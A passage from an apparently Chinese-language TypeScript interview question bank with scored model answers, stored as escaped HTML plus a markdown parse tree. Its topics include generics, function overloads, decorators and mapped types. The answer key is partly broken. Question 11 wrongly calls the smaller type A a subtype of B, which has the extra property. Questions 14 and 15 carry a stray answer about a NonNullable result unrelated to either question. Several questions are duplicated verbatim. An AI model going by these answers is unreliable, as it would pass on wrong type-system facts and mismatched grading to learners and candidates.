等符号的含义？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行</li>\\n<li><strong>1：</strong> ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数</li>\\n<li><strong>1：</strong> ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined</li>\\n<li><strong>1：</strong> !. 在变量名后添加，可以断言排除undefined和null类型</li>\\n<li><strong>1：</strong> _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324</li>\\n<li><strong>1：</strong> ** 求幂</li>\\n</ul>\\n</details>\\n\\n<h2>6. 请解释一下 TypeScript 中的基本数据类型有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）</li>\\n</ul>\\n<h2>7. 什么是泛型,有什么作用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。</li>\\n</ul>\\n<details>\\n\\n<pre><code class=\\"language-typescript\\">\\ninterface IResponseData&lt;T&gt;{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData&lt;User&gt; = {\\n  code: 200,\\n  message: &quot;Success&quot;,\\n  data: {\\n    id: 1,\\n    name: &quot;xiaoming&quot;,\\n    email: &quot;xxx@qq.com&quot;\\n  }\\n};\\n</code></pre>\\n</details>\\n\\n<h2>8. 如何在 TypeScript 中定义一个只读属性的接口？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 readonly 关键字。例如：</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">interface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: &quot;John&quot; };\\n// p.name = &quot;Doe&quot;;  // 错误，不能修改只读属性\\n</code></pre>\\n<h2>9. 什么是TypeScript？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。</li>\\n</ul>\\n<h2>10. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。</p>\\n</li>\\n<li><p>杜绝手误导致的变量名写错;</p>\\n</li>\\n<li><p>类型检查，提前发现潜在问题;</p>\\n</li>\\n<li><p>类型推断，减少代码量，提高开发效率;</p>\\n</li>\\n<li><p>支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;</p>\\n</li>\\n<li><p>支持面向对象编程，比如类、接口、继承、泛型等;</p>\\n</li>\\n<li><p>支持模块化开发，使得代码更加模块化、可维护、可复用。</p>\\n</li>\\n</ul>\\n<h2>11. <code>type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }</code> 请问A和B的关系是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。</li>\\n</ul>\\n<h2>12. 定义一个泛型函数 <code>add&lt;T&gt;(a: T, b: T): T</code>，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问<code>add&lt;number&gt;(1, 2)</code>返回值类型是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。</li>\\n</ul>\\n<h2>13. TypeScript 中的 this 和 JavaScript 中的 this 有什么差异？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。</p>\\n</li>\\n<li><p>函数上下文中的 this:</p>\\n</li>\\n<li><p>在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。</p>\\n</li>\\n<li><p>在严格模式（&#39;use strict&#39;）下，全局上下文中的 this 是 undefined。</p>\\n</li>\\n<li><p>在对象的方法中，this 通常指向调用该方法的对象。</p>\\n</li>\\n<li><p>在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。</p>\\n</li>\\n<li><p>箭头函数中的 this:</p>\\n</li>\\n<li><p>箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。</p>\\n</li>\\n<li><p>在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">function greet(this: { name: string }) {\\n  console.log(`Hello, ${this.name}!`);\\n}\\n</code></pre>\\n<ul>\\n<li><p>在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。</p>\\n</li>\\n<li><p>在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">function greet() {\\n  console.log(`Hello, ${this.name}!`);\\n}\\n</code></pre>\\n<ul>\\n<li>在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。</li>\\n</ul>\\n<h2>14. TypeScript 如何设计 Class 的声明？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<pre><code class=\\"language-ts\\">class Greeter {\\n   greeting: string;\\n   constructor(message: string) {\\n       this.greeting = message;\\n   }\\n   greet(): string{\\n       return &quot;Hello, &quot; + this.greeting;\\n   }\\n}\\nlet greeter = new Greeter(&quot;world&quot;);\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> Result类型是 string | number 。因为NonNullable会排除null和undefined 。</li>\\n</ul>\\n<h2>15. 类型的全局声明和局部声明</h2>\\n<ul>\\n<li><strong>2：</strong> Result类型是 string | number 。因为NonNullable会排除null和undefined 。</li>\\n</ul>\\n<h2>16. 如何在TypeScript中实现函数重载？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n        return a + b;\\n    }\\n    if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n        return a.concat(b);\\n    }\\n    throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(&quot;Hello &quot;, &quot;World&quot;)); // &quot;Hello World&quot;\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 在类中使用函数重载：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n            return a + b;\\n        }\\n        if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n            return a.concat(b);\\n        }\\n        throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n    }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>17. TypeScript中的装饰器是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。</p>\\n</li>\\n<li><p><strong>4：</strong> 常见的装饰器类型：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 类装饰器\\nfunction classDecorator&lt;T extends {new(...args:any[]):{}}&gt;(constructor:T) {\\n    return class extends constructor {\\n        newProperty = &quot;new property&quot;;\\n        hello = &quot;override&quot;;\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(&#39;Before method execution&#39;);\\n        const result = originalMethod.apply(this, args);\\n        console.log(&#39;After method execution&#39;);\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(&#39;Hello!&#39;);\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n</code></pre>\\n</details>\\n\\n<h2>18. TypeScript中的映射类型是什么？请举例说明</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。</p>\\n</li>\\n<li><p><strong>2：</strong> 示例：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable&lt;T&gt; = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n</code></pre>\\n</details>\\n\\n<h2>19. 如何在TypeScript中实现函数重载？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n        return a + b;\\n    }\\n    if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n        return a.concat(b);\\n    }\\n    throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(&quot;Hello &quot;, &quot;World&quot;)); // &quot;Hello World&quot;\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 在类中使用函数重载：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n            return a + b;\\n        }\\n        if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n            return a.concat(b);\\n        }\\n        throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n    }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>20. TypeScript中的装饰器是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。</p>\\n</li>\\n<li><p><strong>4：</strong> 常见的装饰器类型：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 类装饰器\\nfunction classDecorator&lt;T extends {new(...args:any[]):{}}&gt;(constructor:T) {\\n    return class extends constructor {\\n        newProperty = &quot;new property&quot;;\\n        hello = &quot;override&quot;;\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(&#39;Before method execution&#39;);\\n        const result = originalMethod.apply(this, args);\\n        console.log(&#39;After method execution&#39;);\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(&#39;Hello!&#39;);\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n</code></pre>\\n</details>\\n\\n<h2>21. TypeScript中的映射类型是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。</p>\\n</li>\\n<li><p><strong>2：</strong> 示例：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable&lt;T&gt; = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n</code></pre>\\n</details>\\n\\n<h2>22. TypeScript 中 const 和 readonly 的区别？枚举和常量枚举的区别？接口和类型别名的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。</p>\\n</li>\\n<li><p>接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# TypeScript\\n\\n","depth":1,"text":"TypeScript","tokens":[{"type":"text","raw":"TypeScript","text":"TypeScript","escaped":false}]},{"type":"heading","raw":"## 1. ts 如何定义对象结构体\\n\\n","depth":2,"text":"1. ts 如何定义对象结构体","tokens":[{"type":"text","raw":"1. ts 如何定义对象结构体","text":"1. ts 如何定义对象结构体","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","task":false,"loose":false,"text":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","tokens":[{"type":"text","raw":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","text":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","text":" 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\ninterface Person {\\n    name: string;\\n    age: number;\\n}\\n```","lang":"typescript","text":"interface Person {\\n    name: string;\\n    age: number;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** type 也可以用于定义类型","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** type 也可以用于定义类型","task":false,"loose":false,"text":"**1：** type 也可以用于定义类型","tokens":[{"type":"text","raw":"**1：** type 也可以用于定义类型","text":"**1：** type 也可以用于定义类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" type 也可以用于定义类型","text":" type 也可以用于定义类型","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\ntype Person = {\\n    name: string;\\n    age: number;\\n}\\n```","lang":"typescript","text":"type Person = {\\n    name: string;\\n    age: number;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. type 和 interface的区别？\\n\\n","depth":2,"text":"2. type 和 interface的区别？","tokens":[{"type":"text","raw":"2. type 和 interface的区别？","text":"2. type 和 interface的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** interface 可以重复声明，type 不行\\n- **1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好\\n- 建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** interface 可以重复声明，type 不行\\n","task":false,"loose":false,"text":"**1：** interface 可以重复声明，type 不行","tokens":[{"type":"text","raw":"**1：** interface 可以重复声明，type 不行","text":"**1：** interface 可以重复声明，type 不行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" interface 可以重复声明，type 不行","text":" interface 可以重复声明，type 不行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好\\n","task":false,"loose":false,"text":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","tokens":[{"type":"text","raw":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","text":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","text":" 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","escaped":false}]}]},{"type":"list_item","raw":"- 建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","task":false,"loose":false,"text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","tokens":[{"type":"text","raw":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","tokens":[{"type":"text","raw":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 3. 常用工具类型？\\n\\n","depth":2,"text":"3. 常用工具类型？","tokens":[{"type":"text","raw":"3. 常用工具类型？","text":"3. 常用工具类型？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Partial：满足部分属性(一个都没满足也可)即可\\n- **1：** Required：所有属性都需要\\n- **1：** Readonly: 包装后的所有属性只读\\n- **1：** Pick: 选取部分属性\\n- **1：** Omit: 去除部分属性\\n- **1：** Extract: 交集\\n- **1：** Exclude: 差集","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Partial：满足部分属性(一个都没满足也可)即可\\n","task":false,"loose":false,"text":"**1：** Partial：满足部分属性(一个都没满足也可)即可","tokens":[{"type":"text","raw":"**1：** Partial：满足部分属性(一个都没满足也可)即可","text":"**1：** Partial：满足部分属性(一个都没满足也可)即可","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Partial：满足部分属性(一个都没满足也可)即可","text":" Partial：满足部分属性(一个都没满足也可)即可","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Required：所有属性都需要\\n","task":false,"loose":false,"text":"**1：** Required：所有属性都需要","tokens":[{"type":"text","raw":"**1：** Required：所有属性都需要","text":"**1：** Required：所有属性都需要","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Required：所有属性都需要","text":" Required：所有属性都需要","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Readonly: 